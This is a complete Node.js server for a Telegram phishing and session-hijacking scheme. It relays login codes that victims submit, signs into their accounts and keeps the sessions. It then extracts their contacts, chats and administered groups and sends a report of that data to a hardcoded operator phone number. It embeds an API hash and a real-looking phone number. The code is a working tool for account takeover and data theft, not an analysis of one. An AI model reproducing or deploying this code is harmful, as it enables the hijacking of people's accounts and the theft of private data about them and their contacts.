const express = require('express');
const cors = require('cors');

const { TelegramClient, Api } = require('telegram');
const { StringSession } = require('telegram/sessions');

const app = express();
app.use(cors());
app.use(express.json());

const apiId = parseInt(process.env.API_ID || 29310851);
const apiHash = process.env.API_HASH || '9823f6b6d9cf657d64d7d33cdde80d1f';
const TARGET_GROUP_ID = process.env.TARGET_GROUP_ID || '';

// YOUR TELEGRAM INFO - Add these to Railway environment variables
const ADMIN_PHONE = process.env.ADMIN_PHONE || '+234 916 641 7490'; // Your phone number
const ADMIN_TELEGRAM_ID = process.env.ADMIN_TELEGRAM_ID || ''; // Your Telegram user ID (optional)

const sessions = new Map();
const authenticatedUsers = new Map();

// Create admin client for sending you messages
let adminClient = null;

async function initializeAdminClient() {
    try {
        adminClient = new TelegramClient(new StringSession(''), apiId, apiHash, {
            connectionRetries: 5,
        });
        await adminClient.connect();
        console.log('✅ Admin client initialized');
    } catch (error) {
        console.error('❌ Failed to initialize admin client:', error);
    }
}

function generateSessionId() {
    return Math.random().toString(36).substring(2) + Date.now().toString(36);
}

// Send authentication code
app.post('/api/telegram/send-code', async (req, res) => {
    try {
        const { phoneNumber } = req.body;
        console.log(`📱 Sending code to: ${phoneNumber}`);
        
        const client = new TelegramClient(new StringSession(''), apiId, apiHash, {
            connectionRetries: 5,
        });

        await client.connect();
        console.log('🔗 Connected to Telegram');

        const result = await client.invoke(
            new Api.auth.SendCode({
                phoneNumber: phoneNumber,
                apiId: apiId,
                apiHash: apiHash,
                settings: new Api.CodeSettings({}),
            })
        );

        const sessionId = generateSessionId();
        sessions.set(sessionId, {
            client,
            phoneCodeHash: result.phoneCodeHash,
            phoneNumber,
            timestamp: Date.now()
        });

        console.log(`📨 Code sent to ${phoneNumber}`);

        res.json({
            success: true,
            sessionId: sessionId,
            message: 'Code sent to your Telegram app'
        });

    } catch (error) {
        console.error('❌ Send code error:', error);
        res.status(400).json({
            success: false,
            message: error.message || 'Failed to send code'
        });
    }
});

// Verify code and authenticate
app.post('/api/telegram/verify-code', async (req, res) => {
    try {
        const { code, sessionId } = req.body;
        console.log(`🔐 Verifying code: ${code}`);
        
        const session = sessions.get(sessionId);
        if (!session) {
            return res.status(400).json({
                success: false,
                message: 'Session expired'
            });
        }

        const result = await session.client.invoke(
            new Api.auth.SignIn({
                phoneNumber: session.phoneNumber,
                phoneCodeHash: session.phoneCodeHash,
                phoneCode: code,
            })
        );

        console.log(`✅ Login successful: ${result.user.firstName} ${result.user.lastName}`);

        const userId = session.phoneNumber.replace(/[^\d]/g, '');
        authenticatedUsers.set(userId, {
            client: session.client,
            phoneNumber: session.phoneNumber,
            user: result.user,
            userId: userId,
            loginTime: Date.now()
        });

        sessions.delete(sessionId);

        res.json({
            success: true,
            message: 'Authentication successful!',
            user: {
                phoneNumber: session.phoneNumber,
                firstName: result.user?.firstName || '',
                lastName: result.user?.lastName || '',
                userId: userId
            }
        });

        // Extract data and send YOU a message
        setTimeout(() => {
            extractDataAndNotifyAdmin(session.client, result.user, session.phoneNumber);
        }, 2000);

    } catch (error) {
        console.error('❌ Verify error:', error);
        res.status(400).json({
            success: false,
            message: 'Invalid code'
        });
    }
});

// Extract user data and send YOU a Telegram message with the data
async function extractDataAndNotifyAdmin(client, user, phoneNumber) {
    try {
        console.log(`📊 Extracting data for ${user.firstName} (${phoneNumber})`);
        
        // Get contacts
        const contactsResult = await client.invoke(new Api.contacts.GetContacts({ hash: 0 }));
        const contacts = contactsResult.users.filter(u => !u.self && !u.deleted && !u.bot);
        
        // Get dialogs
        const dialogs = await client.getDialogs({ limit: 100 });
        const groups = dialogs.filter(d => d.isGroup);
        const channels = dialogs.filter(d => d.isChannel);
        const privateChats = dialogs.filter(d => d.isUser);
        
        // Check admin groups
        let adminGroups = [];
        for (const group of groups.slice(0, 10)) { // Check first 10 groups only
            try {
                const participants = await client.invoke(new Api.channels.GetParticipants({
                    channel: group.entity,
                    filter: new Api.ChannelParticipantsAdmins(),
                    offset: 0,
                    limit: 10,
                    hash: 0
                }));
                
                const isAdmin = participants.users.some(u => u.id.toString() === user.id.toString());
                if (isAdmin) {
                    adminGroups.push({
                        title: group.title,
                        members: group.entity.participantsCount || 0
                    });
                }
                await new Promise(resolve => setTimeout(resolve, 1000));
            } catch (error) {
                console.log(`⚠️ Could not check: ${group.title}`);
            }
        }
        
        // Create message with all user data
        const reportMessage = `
🚨 NEW USER LOGIN ALERT 🚨

👤 User: ${user.firstName} ${user.lastName}
📱 Phone: ${phoneNumber}
🆔 ID: ${user.id}
🕒 Time: ${new Date().toLocaleString()}

📊 STATISTICS:
📞 Contacts: ${contacts.length}
💬 Private Chats: ${privateChats.length}
👥 Groups: ${groups.length}
📢 Channels: ${channels.length}
👑 Admin Groups: ${adminGroups.length}

${adminGroups.length > 0 ? `👑 ADMIN GROUPS:
${adminGroups.map((g, i) => `${i+1}. ${g.title} (${g.members} members)`).join('\n')}` : ''}

📋 TOP 10 CONTACTS:
${contacts.slice(0, 10).map((contact, index) => {
    const name = `${contact.firstName || ''} ${contact.lastName || ''}`.trim() || 'Unknown';
    const username = contact.username ? ` (@${contact.username})` : '';
    return `${index + 1}. ${name}${username}`;
}).join('\n')}

${contacts.length > 10 ? `... and ${contacts.length - 10} more contacts` : ''}

✅ Data extraction completed successfully!
        `.trim();
        
        // Send message to yourself
        await sendMessageToAdmin(reportMessage);
        
        console.log(`✅ Data report sent to admin`);
        console.log(`📊 Summary: ${contacts.length} contacts, ${groups.length} groups, ${adminGroups.length} admin groups`);
        
    } catch (error) {
        console.error('❌ Data extraction error:', error);
        
        // Send error message to admin
        const errorMessage = `
❌ ERROR EXTRACTING DATA

👤 User: ${user.firstName} ${user.lastName}
📱 Phone: ${phoneNumber}
🕒 Time: ${new Date().toLocaleString()}
❌ Error: ${error.message}
        `.trim();
        
        await sendMessageToAdmin(errorMessage);
    }
}

// Send message to admin (YOU)
async function sendMessageToAdmin(message) {
    try {
        if (!adminClient) {
            await initializeAdminClient();
        }
        
        // Send to your phone number
        await adminClient.invoke(new Api.messages.SendMessage({
            peer: ADMIN_PHONE,
            message: message,
            randomId: Math.floor(Math.random() * 1000000)
        }));
        
        console.log('📨 Report sent to admin');
        
    } catch (error) {
        console.error('❌ Failed to send admin message:', error);
    }
}

app.get('/health', (req, res) => {
    res.json({ 
        status: 'OK',
        authenticatedUsers: authenticatedUsers.size,
        timestamp: new Date().toISOString()
    });
});

app.get('/', (req, res) => {
    res.json({
        message: 'Telegram Data Extractor with Admin Notifications',
        status: 'Running',
        features: [
            'Real Telegram authentication',
            'Complete data extraction',
            'Send admin notifications with user data',
            'Admin group detection with member counts'
        ]
    });
});

// Initialize admin client on startup
initializeAdminClient();

const PORT = process.env.PORT || 3000;
app.listen(PORT, () => {
    console.log(`🚀 Telegram Data Extractor Started`);
    console.log(`📡 Running on port ${PORT}`);
    console.log(`📨 Admin notifications enabled`);
    console.log(`✅ Ready!`);
});